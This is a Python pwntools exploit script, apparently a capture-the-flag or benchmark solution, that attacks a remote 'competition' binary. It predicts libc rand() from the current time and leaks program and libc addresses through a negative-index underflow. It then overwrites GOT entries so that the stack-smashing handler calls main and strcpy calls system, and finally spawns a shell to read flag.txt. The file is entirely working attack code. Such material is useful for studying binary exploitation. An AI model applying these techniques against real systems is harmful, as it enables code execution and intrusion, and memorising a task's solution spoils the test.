import os

from pwn import *
from ctypes import CDLL

libc = CDLL("libc.so.6") # Load a callable version of libc to use the same rand() as the docker container
libcelf = ELF("libc.so.6")

#p = process("./app")
#p = gdb.debug("./app", gdbscript="""
#    #b * main+299
#    #b * scores_view
#    #b * competition_start+691
#    #b * get_competitor_name
#    #b * main+1
#    #b * get_competitor_name+51
#    b * main+602
#""")

p = remote(os.environ["SERVICE_APP_MAIN_HOST"], int(os.environ["SERVICE_APP_MAIN_PORT"]))

# Set up stack smashing
p.recvuntil(b"name: ")
libc.srand(libc.time(0)) # Seed the RNG

payload = b"/bin/sh\x00"
payload += b"A"*(48-len(payload))
p.sendline(payload) # Input name that will later trigger a stack smashing exception

# Leak main address
p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(b"-5") # Use the print functionality with an underflow to leak the address of a function in main

p.recvuntil(b":\n")
leak = p.recvline()
leak = leak.strip().split(b" ")
leak = [int(x) for x in leak][::-1]
bin_rand = 0
for l in leak:
    bin_rand = (bin_rand << 8) + l
print("bin_rand:", hex(bin_rand))

bin_main = bin_rand + 0x9f4
print("bin_main:", hex(bin_main)) # Calculate the address of main

# Leak libc address
p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(b"-6") # Again use the print functionality this time to leak a libc address

p.recvuntil(b":\n")
leak = p.recvline()
leak = leak.strip().split(b" ")
leak = [int(x) for x in leak][::-1]
libc_setvbuf = 0
for l in leak:
    libc_setvbuf = (libc_setvbuf << 8) + l
print("libc_setvbuf:", hex(libc_setvbuf))

libc_system = libc_setvbuf - libcelf.symbols["setvbuf"] + libcelf.symbols["system"]
print("libc_system:", hex(libc_system)) # Find the address of system in libc

# Overwrite stkchk with main
overwrite = { # Bytes that need to be overwritten and their respective underflow offsets
    (bin_main & 0xff): -183, # These two bytes will overwrite the stack smashing handler with main
    ((bin_main >> 8) & 0xff): -182,
    (libc_system & 0xff): -143, # These three bytes will overwrite the strcpy function with system
    ((libc_system >> 8) & 0xff): -142,
    ((libc_system >> 16) & 0xff): -141,
}

print("overwrite:", overwrite)

# Predict the rand() values where the overflow will happen
rands = [libc.rand() for _ in range(43)] # competitor id, 10*2 shots you, 10*2 shots competitor, 1*2 retook shot
while len(overwrite.keys()) > 0:
    p.sendline(b"1")
    shot = ((rands[-2] % 16) << 4) + (rands[-1] % 16) # Predict the byte value
    if not shot in overwrite: # If the predicted value is not in the overwrite dict, restart the competition
        p.sendline(b"3")
        rands.append(libc.rand()) # Predict the next rand() value
        continue

    # Upon success continue the competition
    for i in range(10):
        p.sendline(b"1")
    p.sendline(b"y") # Retake the shot on the negative offset that writes the right byte to GOT
    p.sendline(str(overwrite[shot]).encode())

    rands = [libc.rand() for _ in range(43)] # Predict the next rand values that we used up during the competition
    overwrite.pop(shot)

p.sendline(b"3") # Trigger the stack smashing exception that will now call main
p.recvuntil(b"Exiting.")

p.recvuntil(b"name:")
p.sendline(b"/bin/sh") # Set our name to /bin/sh
p.sendline(b"cat flag.txt") # strcpy will not execute shell using system

print(p.recvall(timeout=10).decode(errors="replace"))
